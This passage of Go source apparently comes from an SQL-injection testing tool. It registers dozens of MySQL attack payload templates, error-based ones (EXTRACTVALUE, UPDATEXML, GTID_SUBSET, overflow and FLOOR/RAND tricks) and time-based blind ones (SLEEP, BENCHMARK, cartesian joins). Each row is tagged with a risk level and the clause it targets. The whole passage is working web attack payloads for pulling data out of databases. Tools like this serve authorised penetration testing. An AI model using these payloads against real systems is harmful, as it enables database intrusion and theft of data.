		mysqlRow("mysql-err-extractvalue-ob", "MySQL >= 5.1 error-based - ORDER BY clause (EXTRACTVALUE)", "error", "orderby", "5.1", "", 1, 4, 88, "and", "comment", "{orig} ORDER BY EXTRACTVALUE(1,CONCAT(0x{m1},(SELECT ({query})),0x{m2}))"),
		mysqlRow("mysql-err-extractvalue-gb", "MySQL >= 5.1 error-based - GROUP BY clause (EXTRACTVALUE)", "error", "groupby", "5.1", "", 1, 4, 88, "and", "comment", "{orig} GROUP BY EXTRACTVALUE(1,CONCAT(0x{m1},(SELECT ({query})),0x{m2}))"),
		mysqlRow("mysql-err-updatexml-ob", "MySQL >= 5.1 error-based - ORDER BY clause (UPDATEXML)", "error", "orderby", "5.1", "", 1, 4, 88, "and", "comment", "{orig} ORDER BY UPDATEXML(1,CONCAT(0x{m1},(SELECT ({query})),0x{m2}),1)"),
		mysqlRow("mysql-err-updatexml-gb", "MySQL >= 5.1 error-based - GROUP BY clause (UPDATEXML)", "error", "groupby", "5.1", "", 1, 4, 88, "and", "comment", "{orig} GROUP BY UPDATEXML(1,CONCAT(0x{m1},(SELECT ({query})),0x{m2}),1)"),
		mysqlRow("mysql-err-gtid-param", "MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)", "error", "generic", "5.6", "", 2, 4, 88, "replace", "comment", "(GTID_SUBSET(CONCAT(0x{m1},(SELECT ({query})),0x{m2}),{query}))"),
		mysqlRow("mysql-err-gtid-orderby", "MySQL >= 5.6 error-based - ORDER BY clause (GTID_SUBSET)", "error", "orderby", "5.6", "", 2, 4, 86, "and", "comment", "{orig} ORDER BY GTID_SUBSET(CONCAT(0x{m1},(SELECT ({query})),0x{m2}),{query})"),
		mysqlRow("mysql-err-exp-having", "MySQL >= 5.5 error-based - HAVING clause (EXP overflow)", "error", "having", "5.5", "", 1, 4, 86, "and", "comment", "{orig} HAVING EXP(~(SELECT * FROM (SELECT CONCAT(0x{m1},(SELECT ({query})),0x{m2}))x))"),
		mysqlRow("mysql-err-bigint-having", "MySQL >= 5.5 error-based - HAVING clause (BIGINT overflow)", "error", "having", "5.5", "", 1, 4, 86, "and", "comment", "{orig} HAVING !(SELECT * FROM (SELECT CONCAT(0x{m1},(SELECT ({query})),0x{m2}))x)-~0"),
		mysqlRow("mysql-err-json-having", "MySQL >= 5.7 error-based - HAVING clause (JSON error)", "error", "having", "5.7", "", 2, 4, 84, "and", "comment", "{orig} HAVING JSON_EXTRACT(CONCAT('[',(SELECT ({query})),']'),0x{marker})"),
		mysqlRow("mysql-err-json-gb", "MySQL >= 5.7 error-based - GROUP BY clause (JSON error)", "error", "groupby", "5.7", "", 2, 4, 84, "and", "comment", "{orig} GROUP BY JSON_EXTRACT(CONCAT('[',(SELECT ({query})),']'),0x{marker})"),
		mysqlRow("mysql-err-xml-extractvalue", "MySQL >= 5.1 error-based - WHERE clause (EXTRACTVALUE id mismatch)", "error", "where", "5.1", "", 1, 3, 88, "and", "comment", "{orig} AND EXTRACTVALUE(1,CONCAT(0x{m1},(SELECT ({query})),0x{m2}))"),
		mysqlRow("mysql-err-polygon", "MySQL >= 5.6 error-based - WHERE clause (POLYGON)", "error", "where", "5.6", "", 2, 4, 86, "and", "comment", "{orig} AND ST_PolygonFromText(CONCAT(0x{m1},(SELECT ({query})),0x{m2}))"),
		mysqlRow("mysql-err-linestring", "MySQL >= 5.6 error-based - WHERE clause (LINESTRING)", "error", "where", "5.6", "", 2, 4, 86, "and", "comment", "{orig} AND ST_LineFromText(CONCAT(0x{m1},(SELECT ({query})),0x{m2}))"),
		mysqlRow("mysql-err-geometry-null", "MySQL >= 5.5 error-based - WHERE clause (Geometry empty)", "error", "where", "5.5", "", 1, 4, 86, "and", "comment", "{orig} AND Geometry(GeomFromText((SELECT CONCAT(0x{m1},(SELECT ({query})),0x{m2}))))"),
		mysqlRow("mysql-err-cast-char", "MySQL error-based - WHERE clause (CAST to char overflow)", "error", "where", "", "", 2, 4, 84, "and", "comment", "{orig} AND CAST((SELECT CONCAT(0x{m1},(SELECT ({query})),0x{m2})) AS CHAR(1))"),
		mysqlRow("mysql-err-lpad-trunc", "MySQL error-based - WHERE clause (LPAD truncation)", "error", "where", "", "", 2, 4, 82, "and", "comment", "{orig} AND LPAD((SELECT ({query})),1,0x{m1})"),
		mysqlRow("mysql-err-replace-bad", "MySQL error-based - WHERE clause (REPLACE type error)", "error", "where", "", "", 1, 4, 82, "and", "comment", "{orig} AND 1=REPLACE((SELECT ({query})),'x','y')+0"),
		mysqlRow("mysql-err-column-am", "MySQL >= 5.0 error-based - Column alias (FLOOR duplicate key)", "error", "generic", "5.0", "", 1, 4, 88, "replace", "comment", "(SELECT 9335 FROM(SELECT COUNT(*),CONCAT(0x{m1},(SELECT ({query})),0x{m2},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x)a)"),

		// ---- MySQL time family (risk 1-2, heavy gated by risk) ----
		mysqlRow("mysql-time-sleep-coalesce", "MySQL >= 5.0.12 time-based blind - WHERE clause (COALESCE + SLEEP)", "time", "where", "5.0.12", "", 1, 2, 86, "and", "comment", "{orig} AND COALESCE(SLEEP({seconds}),0)=0"),
		mysqlRow("mysql-time-sleep-nullif", "MySQL >= 5.0.12 time-based blind - WHERE clause (NULLIF + SLEEP)", "time", "where", "5.0.12", "", 1, 3, 84, "and", "comment", "{orig} AND NULLIF(SLEEP({seconds}),0) IS NULL"),
		mysqlRow("mysql-time-sleep-elapsed", "MySQL >= 5.0.12 time-based blind - WHERE clause (SLEEP in CONCAT)", "time", "where", "5.0.12", "", 1, 3, 84, "and", "comment", "{orig} AND CONCAT(SLEEP({seconds}),'a')='a'"),
		mysqlRow("mysql-time-sleep-lower", "MySQL >= 5.0.12 time-based blind - WHERE clause (LOWER + SLEEP)", "time", "where", "5.0.12", "", 1, 3, 84, "and", "comment", "{orig} AND LOWER(SLEEP({seconds})) IS NULL"),
		mysqlRow("mysql-time-sleep-subquery2", "MySQL >= 5.0.12 time-based blind - WHERE clause (SLEEP double subquery)", "time", "where", "5.0.12", "", 1, 2, 88, "and", "comment", "{orig} AND (SELECT * FROM (SELECT SLEEP({seconds}))a) IS NULL"),
		mysqlRow("mysql-time-case-benchmark", "MySQL time-based blind - WHERE clause (CASE + BENCHMARK)", "time", "where", "", "", 2, 3, 84, "and", "comment", "{orig} AND CASE WHEN 1=1 THEN BENCHMARK(5000000,MD5(1)) ELSE 0 END"),
		mysqlRow("mysql-time-if-benchmark", "MySQL time-based blind - WHERE clause (IF + BENCHMARK)", "time", "where", "", "", 2, 3, 84, "and", "comment", "{orig} AND IF(1=1,BENCHMARK(5000000,MD5(1)),0)"),
		mysqlRow("mysql-time-benchmark-sha2", "MySQL >= 5.6 time-based blind - WHERE clause (BENCHMARK SHA2)", "time", "where", "5.6", "", 2, 3, 84, "and", "comment", "{orig} AND BENCHMARK(10000000,SHA2('vx',256))"),
		mysqlRow("mysql-time-benchmark-crc32", "MySQL time-based blind - WHERE clause (BENCHMARK CRC32)", "time", "where", "", "", 2, 3, 82, "and", "comment", "{orig} AND BENCHMARK(5000000,CRC32('vx'))"),
		mysqlRow("mysql-time-benchmark-upper", "MySQL time-based blind - WHERE clause (BENCHMARK UPPER)", "time", "where", "", "", 2, 3, 82, "and", "comment", "{orig} AND BENCHMARK(10000000,UPPER('vx'))"),
		mysqlRow("mysql-time-heaviness-having", "MySQL time-based blind - HAVING clause (heavy cross join)", "time", "having", "", "", 2, 4, 82, "and", "comment", "{orig} HAVING (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B)"),
		mysqlRow("mysql-time-heaviness-gb", "MySQL time-based blind - GROUP BY clause (heavy cartesian)", "time", "groupby", "", "", 2, 4, 82, "and", "comment", "{orig} GROUP BY (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B)"),
		mysqlRow("mysql-time-sleep-forupdate", "MySQL >= 5.0.12 time-based blind - WHERE clause (SLEEP FOR UPDATE)", "time", "where", "5.0.12", "", 2, 4, 82, "and", "comment", "{orig} AND SLEEP({seconds}) FOR UPDATE"),
		mysqlRow("mysql-time-benchmark-select", "MySQL time-based blind - WHERE clause (BENCHMARK in SELECT list)", "time", "where", "", "", 2, 3, 84, "and", "comment", "{orig} AND (SELECT BENCHMARK(5000000,MD5(1)))"),
		mysqlRow("mysql-time-sleep-regex-based", "MySQL >= 5.1 time-based blind - WHERE clause (regexp + SLEEP)", "time", "where", "5.1", "", 2, 4, 82, "and", "comment", "{orig} AND SLEEP({seconds}) RLIKE '1'"),
	}

	for _, p := range rows {
		MustRegister(p)
	}
}
